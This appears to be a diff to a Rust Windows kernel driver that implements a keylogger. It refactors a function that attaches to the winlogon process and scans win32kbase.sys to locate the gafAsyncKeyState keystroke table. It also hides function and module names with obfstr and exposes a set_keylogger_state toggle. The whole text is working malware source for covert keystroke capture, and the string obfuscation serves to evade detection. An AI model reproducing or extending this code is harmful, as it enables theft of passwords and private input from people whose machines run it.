@@ -8,7 +8,7 @@ use {
         get_ks_byte, get_ks_down_bit,
         includes::MmCopyVirtualMemory,
         is_key_down, set_key_down,
-        utils::{get_address_asynckey, get_module_base_address, get_process_by_name},
+        utils::{address::{get_address_asynckey, get_module_base_address}, get_process_by_name},
     }, 
     wdk_sys::{
         ntddk::{
@@ -172,20 +172,10 @@ unsafe fn get_gafasynckeystate_address() -> Option<PVOID> {
         return None;
     }
 
-    let winlogon_eprocess = match WINLOGON_EPROCESS.as_ref() {
-        Some(p) => p,
-        None => return None
-    };
+    let winlogon_eprocess = WINLOGON_EPROCESS.as_ref()?;
 
-    let module_address = match get_module_base_address(obfstr!("win32kbase.sys")) {
-        Some(addr) => addr,
-        None => return None
-    };
-    let function_address = match get_address_asynckey(obfstr!("NtUserGetAsyncKeyState"), module_address) {
-        Some(addr) => addr,
-        None => return None,
-    };
-
+    let module_address = get_module_base_address(obfstr!("win32kbase.sys"))?;
+    let function_address = get_address_asynckey(obfstr!("NtUserGetAsyncKeyState"), module_address)?;
     let function_bytes = core::slice::from_raw_parts(function_address as *const u8, 200);
 
     KeStackAttachProcess(winlogon_eprocess.e_process, &mut apc_state);
@@ -203,7 +193,6 @@ unsafe fn get_gafasynckeystate_address() -> Option<PVOID> {
         
         let new_base = function_address.cast::<u8>().offset((position + 4) as isize);
         let gaf_async_key_state = new_base.cast::<u8>().offset(offset as isize);
-        log::info!("gafAsyncKeyState address: {:?}", gaf_async_key_state);
 
         KeUnstackDetachProcess(&mut apc_state);
 
@@ -225,5 +214,6 @@ unsafe fn get_gafasynckeystate_address() -> Option<PVOID> {
 ///
 pub unsafe fn set_keylogger_state(info: *mut Keylogger) -> NTSTATUS {
     STATUS = (*info).enable;
+
     STATUS_SUCCESS
 }
